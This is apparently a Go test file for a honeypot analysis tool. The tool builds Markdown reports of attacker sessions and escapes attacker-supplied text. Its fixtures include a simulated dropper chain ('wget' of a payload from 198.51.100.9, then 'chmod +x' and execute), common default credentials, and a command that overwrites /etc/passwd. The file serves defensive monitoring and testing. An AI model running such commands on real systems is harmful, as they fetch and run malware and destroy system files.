package analysis

import (
	"bytes"
	"strings"
	"testing"
	"time"
)

func sampleSessions() []*Session {
	base := time.Date(2026, 9, 20, 2, 0, 0, 0, time.UTC)
	dropper := func(ip, payload string, at time.Time) *Session {
		s := mkSession(ip, at, 45*time.Second, "root", "123456",
			"cd /tmp", "wget http://198.51.100.9/"+payload, "chmod +x "+payload, "./"+payload)
		s.Downloads = []Download{{Tool: "wget", URL: "http://198.51.100.9/" + payload, SavedAs: "/tmp/" + payload}}
		return s
	}
	return []*Session{
		dropper("198.51.100.1", "x86", base),
		dropper("198.51.100.2", "arm7", base.Add(2*time.Hour)),
		mkSession("198.51.100.3", base.Add(26*time.Hour), 3*time.Second, "admin", "admin", "uname -a"),
		mkSession("198.51.100.4", base.Add(27*time.Hour), 2*time.Second, "root", "root"),
	}
}

func TestWriteReportCoversEverything(t *testing.T) {
	var buf bytes.Buffer
	if err := WriteReport(&buf, sampleSessions(), ReportOptions{Transcript: true}); err != nil {
		t.Fatal(err)
	}
	out := buf.String()

	for _, want := range []string{
		"# What the bots did — 2026-09-20 to 2026-09-21",
		"## Overview",
		"**Sessions**: 4 over 2 day(s) (2.0/day)",
		"**Distinct source IPs**: 4",
		"## Did they suspect anything?",
		"## Credentials tried",
		"root:123456",
		"## Attacker behaviours",
		"cd → wget → chmod → ./payload",
		"## Payload families",
		"## Sessions per day",
		"2026-09-20",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("report missing %q\n--- report ---\n%s", want, out)
		}
	}
	// The two droppers differ only in payload name, so they are one behaviour.
	if !strings.Contains(out, "3 distinct behaviour(s) across 4 session(s)") {
		t.Errorf("clustering line wrong:\n%s", out)
	}
	// Silent + probe detection is reported.
	if !strings.Contains(out, "1 session(s) authenticated and never ran a command; 1 ran a single") {
		t.Errorf("detection line wrong:\n%s", out)
	}
	// Transcript requested, so the example commands appear.
	if !strings.Contains(out, "```console") {
		t.Error("transcript block missing")
	}
}

func TestReportEscapesAttackerText(t *testing.T) {
	// An attacker whose password and command contain Markdown must not be
	// able to break the tables the report renders them in.
	base := time.Date(2026, 9, 20, 0, 0, 0, 0, time.UTC)
	nasty := mkSession("198.51.100.1", base, time.Minute, "root", "a|b`c",
		"echo evil | tee /etc/passwd", "cmd\nwith newline")
	var buf bytes.Buffer
	if err := WriteReport(&buf, []*Session{nasty}, ReportOptions{}); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	for _, line := range strings.Split(out, "\n") {
		if !strings.HasPrefix(line, "| `") {
			continue
		}
		// Every table row must have exactly the opening, separator and
		// closing pipes — an unescaped pipe would add more columns.
		if n := strings.Count(line, "|") - strings.Count(line, "\\|"); n != 3 {
			t.Errorf("row has %d unescaped pipes, table broken: %q", n, line)
		}
	}
	if strings.Contains(out, "a|b") {
		t.Error("password pipe not escaped")
	}
	// A newline in a command must not split a table row.
	if strings.Contains(out, "| `cmd\n") {
		t.Error("newline not neutralised")
	}
}

func TestReportWithNoSessions(t *testing.T) {
	var buf bytes.Buffer
	if err := WriteReport(&buf, nil, ReportOptions{}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "No sessions recorded yet") {
		t.Errorf("empty report = %q", buf.String())
	}
}

func TestReportOptionsLimit(t *testing.T) {
	var buf bytes.Buffer
	// TopN=1 must cap every ranked table.
	if err := WriteReport(&buf, sampleSessions(), ReportOptions{TopN: 1, Clusters: 1}); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "_…and 2 more behaviour(s)._") {
		t.Errorf("cluster cap not applied:\n%s", out)
	}
	// The usernames table should show one row (root) and note the rest.
	sec := section(out, "## Usernames")
	if strings.Count(sec, "| `") != 1 {
		t.Errorf("TopN not applied to table:\n%s", sec)
	}
}

func TestShortDuration(t *testing.T) {
	cases := map[time.Duration]string{
		0:                           "0s",
		45 * time.Second:            "45s",
		90 * time.Second:            "1m30s",
		3 * time.Hour:               "3h00m",
		2*time.Hour + 5*time.Minute: "2h05m",
	}
	for d, want := range cases {
		if got := short(d); got != want {
			t.Errorf("short(%v) = %q, want %q", d, got, want)
		}
	}
}

func TestBarWidth(t *testing.T) {
	if barWidth(0, 10) != 0 {
		t.Error("zero count should have no bar")
	}
	if barWidth(1, 1000) != 1 {
		t.Error("a quiet day should still be visible")
	}
	if barWidth(10, 10) != 40 {
		t.Error("the busiest day should fill the width")
	}
}

// section returns the text of a Markdown section, for assertions.
func section(doc, heading string) string {
	i := strings.Index(doc, heading)
	if i < 0 {
		return ""
	}
	rest := doc[i+len(heading):]
	if j := strings.Index(rest, "\n## "); j >= 0 {
		return rest[:j]
	}
	return rest
}

func TestTranscriptCannotEscapeItsFence(t *testing.T) {
	base := time.Date(2026, 9, 20, 0, 0, 0, 0, time.UTC)
	s := mkSession("198.51.100.1", base, time.Minute, "root", "x",
		"echo ```\n## Fake heading injected by the attacker")
	var buf bytes.Buffer
	if err := WriteReport(&buf, []*Session{s}, ReportOptions{Transcript: true}); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	// Exactly one opening and one closing fence: the attacker's ``` must
	// have been neutralised rather than closing the block early.
	if n := strings.Count(out, "```"); n != 2 {
		t.Errorf("found %d fences, attacker broke out of the transcript:\n%s", n, out)
	}
}
